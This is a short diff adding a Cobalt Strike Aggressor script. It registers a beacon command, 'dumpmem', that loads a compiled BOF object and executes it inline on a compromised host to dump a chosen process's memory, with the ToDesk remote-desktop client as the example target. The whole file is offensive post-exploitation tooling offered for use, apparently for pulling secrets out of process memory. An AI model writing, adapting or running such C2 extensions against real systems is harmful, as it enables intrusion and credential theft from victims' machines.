@@ -1,0 +1,18 @@
+beacon_command_register(
+    "dumpmem",
+    "Dump memory of a specific process(example:todesk)",
+    "Usage:dumpmem <todesk_pid>"
+);
+alias dumpmem {
+	local('$handle $data $args');
+	$barch  = barch($1);
+	$args = bof_pack($1, "i",$2);
+
+	$file = script_resource("dumpmem_bof. $+ $barch $+ .obj");
+	$handle = openf($file);
+	$data = readb($handle, -1);
+	closef($handle);
+	btask($1, "Running ...");
+	
+	beacon_inline_execute($1, $data, "go", $args);
+}
